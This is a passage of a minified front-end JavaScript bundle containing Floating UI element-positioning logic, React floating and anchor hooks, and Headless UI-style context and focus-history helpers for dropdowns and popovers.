                    } : {}
                }
            }
        };

    function ox(e) {
        const t = In(e);
        let n = parseFloat(t.width) || 0,
            r = parseFloat(t.height) || 0;
        const i = qn(e),
            o = i ? e.offsetWidth : n,
            s = i ? e.offsetHeight : r,
            a = el(n) !== o || el(r) !== s;
        return a && (n = o, r = s), {
            width: n,
            height: r,
            $: a
        }
    }

    function c0(e) {
        return yt(e) ? e : e.contextElement
    }

    function Jo(e) {
        const t = c0(e);
        if (!qn(t)) return Vn(1);
        const n = t.getBoundingClientRect(),
            {
                width: r,
                height: i,
                $: o
            } = ox(t);
        let s = (o ? el(n.width) : n.width) / r,
            a = (o ? el(n.height) : n.height) / i;
        return (!s || !Number.isFinite(s)) && (s = 1), (!a || !Number.isFinite(a)) && (a = 1), {
            x: s,
            y: a
        }
    }
    const zT = Vn(0);

    function sx(e) {
        const t = Wt(e);
        return !l0() || !t.visualViewport ? zT : {
            x: t.visualViewport.offsetLeft,
            y: t.visualViewport.offsetTop
        }
    }

    function GT(e, t, n) {
        return t === void 0 && (t = !1), !n || t && n !== Wt(e) ? !1 : t
    }

    function io(e, t, n, r) {
        t === void 0 && (t = !1), n === void 0 && (n = !1);
        const i = e.getBoundingClientRect(),
            o = c0(e);
        let s = Vn(1);
        t && (r ? yt(r) && (s = Jo(r)) : s = Jo(e));
        const a = GT(o, n, r) ? sx(o) : Vn(0);
        let l = (i.left + a.x) / s.x,
            u = (i.top + a.y) / s.y,
            c = i.width / s.x,
            d = i.height / s.y;
        if (o) {
            const f = Wt(o),
                h = r && yt(r) ? Wt(r) : r;
            let v = f,
                p = mp(v);
            for (; p && r && h !== v;) {
                const w = Jo(p),
                    m = p.getBoundingClientRect(),
                    g = In(p),
                    y = m.left + (p.clientLeft + parseFloat(g.paddingLeft)) * w.x,
                    x = m.top + (p.clientTop + parseFloat(g.paddingTop)) * w.y;
                l *= w.x, u *= w.y, c *= w.x, d *= w.y, l += y, u += x, v = Wt(p), p = mp(v)
            }
        }
        return hu({
            width: c,
            height: d,
            x: l,
            y: u
        })
    }

    function u0(e, t) {
        const n = Nd(e).scrollLeft;
        return t ? t.left + n : io(Jn(e)).left + n
    }

    function ax(e, t, n) {
        n === void 0 && (n = !1);
        const r = e.getBoundingClientRect(),
            i = r.left + t.scrollLeft - (n ? 0 : u0(e, r)),
            o = r.top + t.scrollTop;
        return {
            x: i,
            y: o
        }
    }

    function VT(e) {
        let {
            elements: t,
            rect: n,
            offsetParent: r,
            strategy: i
        } = e;
        const o = i === "fixed",
            s = Jn(r),
            a = t ? Rd(t.floating) : !1;
        if (r === s || a && o) return n;
        let l = {
                scrollLeft: 0,
                scrollTop: 0
            },
            u = Vn(1);
        const c = Vn(0),
            d = qn(r);
        if ((d || !d && !o) && ((Fs(r) !== "body" || Ll(s)) && (l = Nd(r)), qn(r))) {
            const h = io(r);
            u = Jo(r), c.x = h.x + r.clientLeft, c.y = h.y + r.clientTop
        }
        const f = s && !d && !o ? ax(s, l, !0) : Vn(0);
        return {
            width: n.width * u.x,
            height: n.height * u.y,
            x: n.x * u.x - l.scrollLeft * u.x + c.x + f.x,
            y: n.y * u.y - l.scrollTop * u.y + c.y + f.y
        }
    }

    function WT(e) {
        return Array.from(e.getClientRects())
    }

    function qT(e) {
        const t = Jn(e),
            n = Nd(e),
            r = e.ownerDocument.body,
            i = dt(t.scrollWidth, t.clientWidth, r.scrollWidth, r.clientWidth),
            o = dt(t.scrollHeight, t.clientHeight, r.scrollHeight, r.clientHeight);
        let s = -n.scrollLeft + u0(e);
        const a = -n.scrollTop;
        return In(r).direction === "rtl" && (s += dt(t.clientWidth, r.clientWidth) - i), {
            width: i,
            height: o,
            x: s,
            y: a
        }
    }

    function QT(e, t) {
        const n = Wt(e),
            r = Jn(e),
            i = n.visualViewport;
        let o = r.clientWidth,
            s = r.clientHeight,
            a = 0,
            l = 0;
        if (i) {
            o = i.width, s = i.height;
            const u = l0();
            (!u || u && t === "fixed") && (a = i.offsetLeft, l = i.offsetTop)
        }
        return {
            width: o,
            height: s,
            x: a,
            y: l
        }
    }

    function KT(e, t) {
        const n = io(e, !0, t === "fixed"),
            r = n.top + e.clientTop,
            i = n.left + e.clientLeft,
            o = qn(e) ? Jo(e) : Vn(1),
            s = e.clientWidth * o.x,
            a = e.clientHeight * o.y,
            l = i * o.x,
            u = r * o.y;
        return {
            width: s,
            height: a,
            x: l,
            y: u
        }
    }

    function zv(e, t, n) {
        let r;
        if (t === "viewport") r = QT(e, n);
        else if (t === "document") r = qT(Jn(e));
        else if (yt(t)) r = KT(t, n);
        else {
            const i = sx(e);
            r = {
                x: t.x - i.x,
                y: t.y - i.y,
                width: t.width,
                height: t.height
            }
        }
        return hu(r)
    }

    function lx(e, t) {
        const n = oi(e);
        return n === t || !yt(n) || ds(n) ? !1 : In(n).position === "fixed" || lx(n, t)
    }

    function ZT(e, t) {
        const n = t.get(e);
        if (n) return n;
        let r = Xa(e, [], !1).filter(a => yt(a) && Fs(a) !== "body"),
            i = null;
        const o = In(e).position === "fixed";
        let s = o ? oi(e) : e;
        for (; yt(s) && !ds(s);) {
            const a = In(s),
                l = a0(s);
            !l && a.position === "fixed" && (i = null), (o ? !l && !i : !l && a.position === "static" && !!i && ["absolute", "fixed"].includes(i.position) || Ll(s) && !l && lx(e, s)) ? r = r.filter(c => c !== s) : i = a, s = oi(s)
        }
        return t.set(e, r), r
    }

    function YT(e) {
        let {
            element: t,
            boundary: n,
            rootBoundary: r,
            strategy: i
        } = e;
        const s = [...n === "clippingAncestors" ? Rd(t) ? [] : ZT(t, this._c) : [].concat(n), r],
            a = s[0],
            l = s.reduce((u, c) => {
                const d = zv(t, c, i);
                return u.top = dt(d.top, u.top), u.right = no(d.right, u.right), u.bottom = no(d.bottom, u.bottom), u.left = dt(d.left, u.left), u
            }, zv(t, a, i));
        return {
            width: l.right - l.left,
            height: l.bottom - l.top,
            x: l.left,
            y: l.top
        }
    }

    function JT(e) {
        const {
            width: t,
            height: n
        } = ox(e);
        return {
            width: t,
            height: n
        }
    }

    function XT(e, t, n) {
        const r = qn(t),
            i = Jn(t),
            o = n === "fixed",
            s = io(e, !0, o, t);
        let a = {
            scrollLeft: 0,
            scrollTop: 0
        };
        const l = Vn(0);
        if (r || !r && !o)
            if ((Fs(t) !== "body" || Ll(i)) && (a = Nd(t)), r) {
                const f = io(t, !0, o, t);
                l.x = f.x + t.clientLeft, l.y = f.y + t.clientTop
            } else i && (l.x = u0(i));
        const u = i && !r && !o ? ax(i, a) : Vn(0),
            c = s.left + a.scrollLeft - l.x - u.x,
            d = s.top + a.scrollTop - l.y - u.y;
        return {
            x: c,
            y: d,
            width: s.width,
            height: s.height
        }
    }

    function zf(e) {
        return In(e).position === "static"
    }

    function Gv(e, t) {
        if (!qn(e) || In(e).position === "fixed") return null;
        if (t) return t(e);
        let n = e.offsetParent;
        return Jn(e) === n && (n = n.ownerDocument.body), n
    }

    function cx(e, t) {
        const n = Wt(e);
        if (Rd(e)) return n;
        if (!qn(e)) {
            let i = oi(e);
            for (; i && !ds(i);) {
                if (yt(i) && !zf(i)) return i;
                i = oi(i)
            }
            return n
        }
        let r = Gv(e, t);
        for (; r && kT(r) && zf(r);) r = Gv(r, t);
        return r && ds(r) && zf(r) && !a0(r) ? n : r || TT(e) || n
    }
    const eI = async function(e) {
        const t = this.getOffsetParent || cx,
            n = this.getDimensions,
            r = await n(e.floating);
        return {
            reference: XT(e.reference, await t(e.floating), e.strategy),
            floating: {
                x: 0,
                y: 0,
                width: r.width,
                height: r.height
            }
        }
    };

    function tI(e) {
        return In(e).direction === "rtl"
    }
    const nI = {
        convertOffsetParentRelativeRectToViewportRelativeRect: VT,
        getDocumentElement: Jn,
        getClippingRect: YT,
        getOffsetParent: cx,
        getElementRects: eI,
        getClientRects: WT,
        getDimensions: JT,
        getScale: Jo,
        isElement: yt,
        isRTL: tI
    };

    function rI(e, t) {
        let n = null,
            r;
        const i = Jn(e);

        function o() {
            var a;
            clearTimeout(r), (a = n) == null || a.disconnect(), n = null
        }

        function s(a, l) {
            a === void 0 && (a = !1), l === void 0 && (l = 1), o();
            const {
                left: u,
                top: c,
                width: d,
                height: f
            } = e.getBoundingClientRect();
            if (a || t(), !d || !f) return;
            const h = hc(c),
                v = hc(i.clientWidth - (u + d)),
                p = hc(i.clientHeight - (c + f)),
                w = hc(u),
                g = {
                    rootMargin: -h + "px " + -v + "px " + -p + "px " + -w + "px",
                    threshold: dt(0, no(1, l)) || 1
                };
            let y = !0;

            function x(E) {
                const k = E[0].intersectionRatio;
                if (k !== l) {
                    if (!y) return s();
                    k ? s(!1, k) : r = setTimeout(() => {
                        s(!1, 1e-7)
                    }, 1e3)
                }
                y = !1
            }
            try {
                n = new IntersectionObserver(x, { ...g,
                    root: i.ownerDocument
                })
            } catch {
                n = new IntersectionObserver(x, g)
            }
            n.observe(e)
        }
        return s(!0), o
    }

    function iI(e, t, n, r) {
        r === void 0 && (r = {});
        const {
            ancestorScroll: i = !0,
            ancestorResize: o = !0,
            elementResize: s = typeof ResizeObserver == "function",
            layoutShift: a = typeof IntersectionObserver == "function",
            animationFrame: l = !1
        } = r, u = c0(e), c = i || o ? [...u ? Xa(u) : [], ...Xa(t)] : [];
        c.forEach(m => {
            i && m.addEventListener("scroll", n, {
                passive: !0
            }), o && m.addEventListener("resize", n)
        });
        const d = u && a ? rI(u, n) : null;
        let f = -1,
            h = null;
        s && (h = new ResizeObserver(m => {
            let [g] = m;
            g && g.target === u && h && (h.unobserve(t), cancelAnimationFrame(f), f = requestAnimationFrame(() => {
                var y;
                (y = h) == null || y.observe(t)
            })), n()
        }), u && !l && h.observe(u), h.observe(t));
        let v, p = l ? io(e) : null;
        l && w();

        function w() {
            const m = io(e);
            p && (m.x !== p.x || m.y !== p.y || m.width !== p.width || m.height !== p.height) && n(), p = m, v = requestAnimationFrame(w)
        }
        return n(), () => {
            var m;
            c.forEach(g => {
                i && g.removeEventListener("scroll", n), o && g.removeEventListener("resize", n)
            }), d == null || d(), (m = h) == null || m.disconnect(), h = null, l && cancelAnimationFrame(v)
        }
    }
    const Gf = Bd,
        oI = HT,
        sI = $T,
        aI = DT,
        lI = UT,
        cI = (e, t, n) => {
            const r = new Map,
                i = {
                    platform: nI,
                    ...n
                },
                o = { ...i.platform,
                    _c: r
                };
            return FT(e, t, { ...i,
                platform: o
            })
        };
    var Pc = typeof document < "u" ? b.useLayoutEffect : b.useEffect;

    function pu(e, t) {
        if (e === t) return !0;
        if (typeof e != typeof t) return !1;
        if (typeof e == "function" && e.toString() === t.toString()) return !0;
        let n, r, i;
        if (e && t && typeof e == "object") {
            if (Array.isArray(e)) {
                if (n = e.length, n !== t.length) return !1;
                for (r = n; r-- !== 0;)
                    if (!pu(e[r], t[r])) return !1;
                return !0
            }
            if (i = Object.keys(e), n = i.length, n !== Object.keys(t).length) return !1;
            for (r = n; r-- !== 0;)
                if (!{}.hasOwnProperty.call(t, i[r])) return !1;
            for (r = n; r-- !== 0;) {
                const o = i[r];
                if (!(o === "_owner" && e.$$typeof) && !pu(e[o], t[o])) return !1
            }
            return !0
        }
        return e !== e && t !== t
    }

    function ux(e) {
        return typeof window > "u" ? 1 : (e.ownerDocument.defaultView || window).devicePixelRatio || 1
    }

    function Vv(e, t) {
        const n = ux(e);
        return Math.round(t * n) / n
    }

    function Vf(e) {
        const t = b.useRef(e);
        return Pc(() => {
            t.current = e
        }), t
    }

    function uI(e) {
        e === void 0 && (e = {});
        const {
            placement: t = "bottom",
            strategy: n = "absolute",
            middleware: r = [],
            platform: i,
            elements: {
                reference: o,
                floating: s
            } = {},
            transform: a = !0,
            whileElementsMounted: l,
            open: u
        } = e, [c, d] = b.useState({
            x: 0,
            y: 0,
            strategy: n,
            placement: t,
            middlewareData: {},
            isPositioned: !1
        }), [f, h] = b.useState(r);
        pu(f, r) || h(r);
        const [v, p] = b.useState(null), [w, m] = b.useState(null), g = b.useCallback(T => {
            T !== k.current && (k.current = T, p(T))
        }, []), y = b.useCallback(T => {
            T !== I.current && (I.current = T, m(T))
        }, []), x = o || v, E = s || w, k = b.useRef(null), I = b.useRef(null), _ = b.useRef(c), L = l != null, C = Vf(l), M = Vf(i), F = Vf(u), U = b.useCallback(() => {
            if (!k.current || !I.current) return;
            const T = {
                placement: t,
                strategy: n,
                middleware: f
            };
            M.current && (T.platform = M.current), cI(k.current, I.current, T).then(B => {
                const R = { ...B,
                    isPositioned: F.current !== !1
                };
                Q.current && !pu(_.current, R) && (_.current = R, Sn.flushSync(() => {
                    d(R)
                }))
            })
        }, [f, t, n, M, F]);
        Pc(() => {
            u === !1 && _.current.isPositioned && (_.current.isPositioned = !1, d(T => ({ ...T,
                isPositioned: !1
            })))
        }, [u]);
        const Q = b.useRef(!1);
        Pc(() => (Q.current = !0, () => {
            Q.current = !1
        }), []), Pc(() => {
            if (x && (k.current = x), E && (I.current = E), x && E) {
                if (C.current) return C.current(x, E, U);
                U()
            }
        }, [x, E, U, C, L]);
        const A = b.useMemo(() => ({
                reference: k,
                floating: I,
                setReference: g,
                setFloating: y
            }), [g, y]),
            P = b.useMemo(() => ({
                reference: x,
                floating: E
            }), [x, E]),
            O = b.useMemo(() => {
                const T = {
                    position: n,
                    left: 0,
                    top: 0
                };
                if (!P.floating) return T;
                const B = Vv(P.floating, c.x),
                    R = Vv(P.floating, c.y);
                return a ? { ...T,
                    transform: "translate(" + B + "px, " + R + "px)",
                    ...ux(P.floating) >= 1.5 && {
                        willChange: "transform"
                    }
                } : {
                    position: n,
                    left: B,
                    top: R
                }
            }, [n, a, P.floating, c.x, c.y]);
        return b.useMemo(() => ({ ...c,
            update: U,
            refs: A,
            elements: P,
            floatingStyles: O
        }), [c, U, A, P, O])
    }
    const dx = (e, t) => ({ ...oI(e),
            options: [e, t]
        }),
        dI = (e, t) => ({ ...sI(e),
            options: [e, t]
        }),
        fI = (e, t) => ({ ...aI(e),
            options: [e, t]
        }),
        hI = (e, t) => ({ ...lI(e),
            options: [e, t]
        }),
        fx = { ...mh
        },
        pI = fx.useInsertionEffect,
        mI = pI || (e => e());

    function hx(e) {
        const t = b.useRef(() => {});
        return mI(() => {
            t.current = e
        }), b.useCallback(function() {
            for (var n = arguments.length, r = new Array(n), i = 0; i < n; i++) r[i] = arguments[i];
            return t.current == null ? void 0 : t.current(...r)
        }, [])
    }
    var vp = typeof document < "u" ? b.useLayoutEffect : b.useEffect;
    let Wv = !1,
        gI = 0;
    const qv = () => "floating-ui-" + Math.random().toString(36).slice(2, 6) + gI++;

    function vI() {
        const [e, t] = b.useState(() => Wv ? qv() : void 0);
        return vp(() => {
            e == null && t(qv())
        }, []), b.useEffect(() => {
            Wv = !0
        }, []), e
    }
    const yI = fx.useId,
        wI = yI || vI;

    function bI() {
        const e = new Map;
        return {
            emit(t, n) {
                var r;
                (r = e.get(t)) == null || r.forEach(i => i(n))
            },
            on(t, n) {
                e.set(t, [...e.get(t) || [], n])
            },
            off(t, n) {
                var r;
                e.set(t, ((r = e.get(t)) == null ? void 0 : r.filter(i => i !== n)) || [])
            }
        }
    }
    const xI = b.createContext(null),
        EI = b.createContext(null),
        AI = () => {
            var e;
            return ((e = b.useContext(xI)) == null ? void 0 : e.id) || null
        },
        _I = () => b.useContext(EI),
        SI = "data-floating-ui-focusable";

    function kI(e) {
        const {
            open: t = !1,
            onOpenChange: n,
            elements: r
        } = e, i = wI(), o = b.useRef({}), [s] = b.useState(() => bI()), a = AI() != null, [l, u] = b.useState(r.reference), c = hx((h, v, p) => {
            o.current.openEvent = h ? v : void 0, s.emit("openchange", {
                open: h,
                event: v,
                reason: p,
                nested: a
            }), n == null || n(h, v, p)
        }), d = b.useMemo(() => ({
            setPositionReference: u
        }), []), f = b.useMemo(() => ({
            reference: l || r.reference || null,
            floating: r.floating || null,
            domReference: r.reference
        }), [l, r.reference, r.floating]);
        return b.useMemo(() => ({
            dataRef: o,
            open: t,
            onOpenChange: c,
            elements: f,
            events: s,
            floatingId: i,
            refs: d
        }), [t, c, f, s, i, d])
    }

    function TI(e) {
        e === void 0 && (e = {});
        const {
            nodeId: t
        } = e, n = kI({ ...e,
            elements: {
                reference: null,
                floating: null,
                ...e.elements
            }
        }), r = e.rootContext || n, i = r.elements, [o, s] = b.useState(null), [a, l] = b.useState(null), c = (i == null ? void 0 : i.domReference) || o, d = b.useRef(null), f = _I();
        vp(() => {
            c && (d.current = c)
        }, [c]);
        const h = uI({ ...e,
                elements: { ...i,
                    ...a && {
                        reference: a
                    }
                }
            }),
            v = b.useCallback(y => {
                const x = yt(y) ? {
                    getBoundingClientRect: () => y.getBoundingClientRect(),
                    contextElement: y
                } : y;
                l(x), h.refs.setReference(x)
            }, [h.refs]),
            p = b.useCallback(y => {
                (yt(y) || y === null) && (d.current = y, s(y)), (yt(h.refs.reference.current) || h.refs.reference.current === null || y !== null && !yt(y)) && h.refs.setReference(y)
            }, [h.refs]),
            w = b.useMemo(() => ({ ...h.refs,
                setReference: p,
                setPositionReference: v,
                domReference: d
            }), [h.refs, p, v]),
            m = b.useMemo(() => ({ ...h.elements,
                domReference: c
            }), [h.elements, c]),
            g = b.useMemo(() => ({ ...h,
                ...r,
                refs: w,
                elements: m,
                nodeId: t
            }), [h, w, m, t, r]);
        return vp(() => {
            r.dataRef.current.floatingContext = g;
            const y = f == null ? void 0 : f.nodesRef.current.find(x => x.id === t);
            y && (y.context = g)
        }), b.useMemo(() => ({ ...h,
            context: g,
            refs: w,
            elements: m
        }), [h, w, m, g])
    }
    const Qv = "active",
        Kv = "selected";

    function Wf(e, t, n) {
        const r = new Map,
            i = n === "item";
        let o = e;
        if (i && e) {
            const {
                [Qv]: s, [Kv]: a, ...l
            } = e;
            o = l
        }
        return { ...n === "floating" && {
                tabIndex: -1,
                [SI]: ""
            },
            ...o,
            ...t.map(s => {
                const a = s ? s[n] : null;
                return typeof a == "function" ? e ? a(e) : null : a
            }).concat(e).reduce((s, a) => (a && Object.entries(a).forEach(l => {
                let [u, c] = l;
                if (!(i && [Qv, Kv].includes(u)))
                    if (u.indexOf("on") === 0) {
                        if (r.has(u) || r.set(u, []), typeof c == "function") {
                            var d;
                            (d = r.get(u)) == null || d.push(c), s[u] = function() {
                                for (var f, h = arguments.length, v = new Array(h), p = 0; p < h; p++) v[p] = arguments[p];
                                return (f = r.get(u)) == null ? void 0 : f.map(w => w(...v)).find(w => w !== void 0)
                            }
                        }
                    } else s[u] = c
            }), s), {})
        }
    }

    function II(e) {
        e === void 0 && (e = []);
        const t = e.map(a => a == null ? void 0 : a.reference),
            n = e.map(a => a == null ? void 0 : a.floating),
            r = e.map(a => a == null ? void 0 : a.item),
            i = b.useCallback(a => Wf(a, e, "reference"), t),
            o = b.useCallback(a => Wf(a, e, "floating"), n),
            s = b.useCallback(a => Wf(a, e, "item"), r);
        return b.useMemo(() => ({
            getReferenceProps: i,
            getFloatingProps: o,
            getItemProps: s
        }), [i, o, s])
    }

    function Zv(e, t) {
        return { ...e,
            rects: { ...e.rects,
                floating: { ...e.rects.floating,
                    height: t
                }
            }
        }
    }
    const CI = e => ({
        name: "inner",
        options: e,
        async fn(t) {
            const {
                listRef: n,
                overflowRef: r,
                onFallbackChange: i,
                offset: o = 0,
                index: s = 0,
                minItemsVisible: a = 4,
                referenceOverflowThreshold: l = 0,
                scrollRef: u,
                ...c
            } = Ds(e, t), {
                rects: d,
                elements: {
                    floating: f
                }
            } = t, h = n.current[s], v = (u == null ? void 0 : u.current) || f, p = f.clientTop || v.clientTop, w = f.clientTop !== 0, m = v.clientTop !== 0, g = f === v;
            if (!h) return {};
            const y = { ...t,
                    ...await dx(-h.offsetTop - f.clientTop - d.reference.height / 2 - h.offsetHeight / 2 - o).fn(t)
                },
                x = await Gf(Zv(y, v.scrollHeight + p + f.clientTop), c),
                E = await Gf(y, { ...c,
                    elementContext: "reference"
                }),
                k = dt(0, x.top),
                I = y.y + k,
                C = (v.scrollHeight > v.clientHeight ? M => M : el)(dt(0, v.scrollHeight + (w && g || m ? p * 2 : 0) - k - dt(0, x.bottom)));
            if (v.style.maxHeight = C + "px", v.scrollTop = k, i) {
                const M = v.offsetHeight < h.offsetHeight * no(a, n.current.length) - 1 || E.top >= -l || E.bottom >= -l;
                Sn.flushSync(() => i(M))
            }
            return r && (r.current = await Gf(Zv({ ...y,
                y: I
            }, v.offsetHeight + p + f.clientTop), c)), {
                y: I
            }
        }
    });

    function PI(e, t) {
        const {
            open: n,
            elements: r
        } = e, {
            enabled: i = !0,
            overflowRef: o,
            scrollRef: s,
            onChange: a
        } = t, l = hx(a), u = b.useRef(!1), c = b.useRef(null), d = b.useRef(null);
        b.useEffect(() => {
            if (!i) return;

            function h(p) {
                if (p.ctrlKey || !v || o.current == null) return;
                const w = p.deltaY,
                    m = o.current.top >= -.5,
                    g = o.current.bottom >= -.5,
                    y = v.scrollHeight - v.clientHeight,
                    x = w < 0 ? -1 : 1,
                    E = w < 0 ? "max" : "min";
                v.scrollHeight <= v.clientHeight || (!m && w > 0 || !g && w < 0 ? (p.preventDefault(), Sn.flushSync(() => {
                    l(k => k + Math[E](w, y * x))
                })) : /firefox/i.test(IT()) && (v.scrollTop += w))
            }
            const v = (s == null ? void 0 : s.current) || r.floating;
            if (n && v) return v.addEventListener("wheel", h), requestAnimationFrame(() => {
                c.current = v.scrollTop, o.current != null && (d.current = { ...o.current
                })
            }), () => {
                c.current = null, d.current = null, v.removeEventListener("wheel", h)
            }
        }, [i, n, r.floating, o, s, l]);
        const f = b.useMemo(() => ({
            onKeyDown() {
                u.current = !0
            },
            onWheel() {
                u.current = !1
            },
            onPointerMove() {
                u.current = !1
            },
            onScroll() {
                const h = (s == null ? void 0 : s.current) || r.floating;
                if (!(!o.current || !h || !u.current)) {
                    if (c.current !== null) {
                        const v = h.scrollTop - c.current;
                        (o.current.bottom < -.5 && v < -1 || o.current.top < -.5 && v > 1) && Sn.flushSync(() => l(p => p + v))
                    }
                    requestAnimationFrame(() => {
                        c.current = h.scrollTop
                    })
                }
            }
        }), [r.floating, l, o, s]);
        return b.useMemo(() => i ? {
            floating: f
        } : {}, [i, f])
    }
    let js = b.createContext({
        styles: void 0,
        setReference: () => {},
        setFloating: () => {},
        getReferenceProps: () => ({}),
        getFloatingProps: () => ({}),
        slot: {}
    });
    js.displayName = "FloatingContext";
    let d0 = b.createContext(null);
    d0.displayName = "PlacementContext";

    function RI(e) {
        return b.useMemo(() => e ? typeof e == "string" ? {
            to: e
        } : e : null, [e])
    }

    function NI() {
        return b.useContext(js).setReference
    }

    function BI() {
        return b.useContext(js).getReferenceProps
    }

    function MI() {
        let {
            getFloatingProps: e,
            slot: t
        } = b.useContext(js);
        return b.useCallback((...n) => Object.assign({}, e(...n), {
            "data-anchor": t.anchor
        }), [e, t])
    }

    function OI(e = null) {
        e === !1 && (e = null), typeof e == "string" && (e = {
            to: e
        });
        let t = b.useContext(d0),
            n = b.useMemo(() => e, [JSON.stringify(e, (i, o) => {
                var s;
                return (s = o == null ? void 0 : o.outerHTML) != null ? s : o
            })]);
        ve(() => {
            t == null || t(n ?? null)
        }, [t, n]);
        let r = b.useContext(js);
        return b.useMemo(() => [r.setFloating, e ? r.styles : {}], [r.setFloating, e, r.styles])
    }
    let Yv = 4;

    function LI({
        children: e,
        enabled: t = !0
    }) {
        let [n, r] = b.useState(null), [i, o] = b.useState(0), s = b.useRef(null), [a, l] = b.useState(null);
        FI(a);
        let u = t && n !== null && a !== null,
            {
                to: c = "bottom",
                gap: d = 0,
                offset: f = 0,
                padding: h = 0,
                inner: v
            } = DI(n, a),
            [p, w = "center"] = c.split(" ");
        ve(() => {
            u && o(0)
        }, [u]);
        let {
            refs: m,
            floatingStyles: g,
            context: y
        } = TI({
            open: u,
            placement: p === "selection" ? w === "center" ? "bottom" : `bottom-${w}` : w === "center" ? `${p}` : `${p}-${w}`,
            strategy: "absolute",
            transform: !1,
            middleware: [dx({
                mainAxis: p === "selection" ? 0 : d,
                crossAxis: f
            }), dI({
                padding: h
            }), p !== "selection" && fI({
                padding: h
            }), p === "selection" && v ? CI({ ...v,
                padding: h,
                overflowRef: s,
                offset: i,
                minItemsVisible: Yv,
                referenceOverflowThreshold: h,
                onFallbackChange(M) {
                    var F, U;
                    if (!M) return;
                    let Q = y.elements.floating;
                    if (!Q) return;
                    let A = parseFloat(getComputedStyle(Q).scrollPaddingBottom) || 0,
                        P = Math.min(Yv, Q.childElementCount),
                        O = 0,
                        T = 0;
                    for (let B of (U = (F = y.elements.floating) == null ? void 0 : F.childNodes) != null ? U : [])
                        if (B instanceof HTMLElement) {
                            let R = B.offsetTop,
                                $ = R + B.clientHeight + A,
                                Z = Q.scrollTop,
                                ie = Z + Q.clientHeight;
                            if (R >= Z && $ <= ie) P--;
                            else {
                                T = Math.max(0, Math.min($, ie) - Math.max(R, Z)), O = B.clientHeight;
                                break
                            }
                        }
                    P >= 1 && o(B => {
                        let R = O * P - T + A;
                        return B >= R ? B : R
                    })
                }
            }) : null, hI({
                padding: h,
                apply({
                    availableWidth: M,
                    availableHeight: F,
                    elements: U
                }) {
                    Object.assign(U.floating.style, {
                        overflow: "auto",
                        maxWidth: `${M}px`,
                        maxHeight: `min(var(--anchor-max-height, 100vh), ${F}px)`
                    })
                }
            })].filter(Boolean),
            whileElementsMounted: iI
        }), [x = p, E = w] = y.placement.split("-");
        p === "selection" && (x = "selection");
        let k = b.useMemo(() => ({
                anchor: [x, E].filter(Boolean).join(" ")
            }), [x, E]),
            I = PI(y, {
                overflowRef: s,
                onChange: o
            }),
            {
                getReferenceProps: _,
                getFloatingProps: L
            } = II([I]),
            C = J(M => {
                l(M), m.setFloating(M)
            });
        return b.createElement(d0.Provider, {
            value: r
        }, b.createElement(js.Provider, {
            value: {
                setFloating: C,
                setReference: m.setReference,
                styles: g,
                getReferenceProps: _,
                getFloatingProps: L,
                slot: k
            }
        }, e))
    }

    function FI(e) {
        ve(() => {
            if (!e) return;
            let t = new MutationObserver(() => {
                let n = window.getComputedStyle(e).maxHeight,
                    r = parseFloat(n);
                if (isNaN(r)) return;
                let i = parseInt(n);
                isNaN(i) || r !== i && (e.style.maxHeight = `${Math.ceil(r)}px`)
            });
            return t.observe(e, {
                attributes: !0,
                attributeFilter: ["style"]
            }), () => {
                t.disconnect()
            }
        }, [e])
    }

    function DI(e, t) {
        var n, r, i;
        let o = qf((n = e == null ? void 0 : e.gap) != null ? n : "var(--anchor-gap, 0)", t),
            s = qf((r = e == null ? void 0 : e.offset) != null ? r : "var(--anchor-offset, 0)", t),
            a = qf((i = e == null ? void 0 : e.padding) != null ? i : "var(--anchor-padding, 0)", t);
        return { ...e,
            gap: o,
            offset: s,
            padding: a
        }
    }

    function qf(e, t, n = void 0) {
        let r = Ms(),
            i = J((l, u) => {
                if (l == null) return [n, null];
                if (typeof l == "number") return [l, null];
                if (typeof l == "string") {
                    if (!u) return [n, null];
                    let c = Jv(l, u);
                    return [c, d => {
                        let f = px(l); {
                            let h = f.map(v => window.getComputedStyle(u).getPropertyValue(v));
                            r.requestAnimationFrame(function v() {
                                r.nextFrame(v);
                                let p = !1;
                                for (let [m, g] of f.entries()) {
                                    let y = window.getComputedStyle(u).getPropertyValue(g);
                                    if (h[m] !== y) {
                                        h[m] = y, p = !0;
                                        break
                                    }
                                }
                                if (!p) return;
                                let w = Jv(l, u);
                                c !== w && (d(w), c = w)
                            })
                        }
                        return r.dispose
                    }]
                }
                return [n, null]
            }),
            o = b.useMemo(() => i(e, t)[0], [e, t]),
            [s = o, a] = b.useState();
        return ve(() => {
            let [l, u] = i(e, t);
            if (a(l), !!u) return u(a)
        }, [e, t]), s
    }

    function px(e) {
        let t = /var\((.*)\)/.exec(e);
        if (t) {
            let n = t[1].indexOf(",");
            if (n === -1) return [t[1]];
            let r = t[1].slice(0, n).trim(),
                i = t[1].slice(n + 1).trim();
            return i ? [r, ...px(i)] : [r]
        }
        return []
    }

    function Jv(e, t) {
        let n = document.createElement("div");
        t.appendChild(n), n.style.setProperty("margin-top", "0px", "important"), n.style.setProperty("margin-top", e, "important");
        let r = parseFloat(window.getComputedStyle(n).marginTop) || 0;
        return t.removeChild(n), r
    }
    let Md = b.createContext(null);
    Md.displayName = "OpenClosedContext";
    var wt = (e => (e[e.Open = 1] = "Open", e[e.Closed = 2] = "Closed", e[e.Closing = 4] = "Closing", e[e.Opening = 8] = "Opening", e))(wt || {});

    function Dl() {
        return b.useContext(Md)
    }

    function mx({
        value: e,
        children: t
    }) {
        return q.createElement(Md.Provider, {
            value: e
        }, t)
    }

    function jI({
        children: e
    }) {
        return q.createElement(Md.Provider, {
            value: null
        }, e)
    }

    function HI(e) {
        function t() {
            document.readyState !== "loading" && (e(), document.removeEventListener("DOMContentLoaded", t))
        }
        typeof window < "u" && typeof document < "u" && (document.addEventListener("DOMContentLoaded", t), t())
    }
    let jr = [];
    HI(() => {
        function e(t) {
            if (!(t.target instanceof HTMLElement) || t.target === document.body || jr[0] === t.target) return;
            let n = t.target;
            n = n.closest(du), jr.unshift(n ?? t.target), jr = jr.filter(r => r != null && r.isConnected), jr.splice(10)
        }
        window.addEventListener("click", e, {
            capture: !0
        }), window.addEventListener("mousedown", e, {
            capture: !0
        }), window.addEventListener("focus", e, {
            capture: !0
        }), document.body.addEventListener("click", e, {
            capture: !0
        }), document.body.addEventListener("mousedown", e, {
            capture: !0
        }), document.body.addEventListener("focus", e, {
            capture: !0
        })
    });

    function $I(e) {
        throw new Error("Unexpected object: " + e)
    }
    var ft = (e => (e[e.First = 0] = "First", e[e.Previous = 1] = "Previous", e[e.Next = 2] = "Next", e[e.Last = 3] = "Last", e[e.Specific = 4] = "Specific", e[e.Nothing = 5] = "Nothing", e))(ft || {});

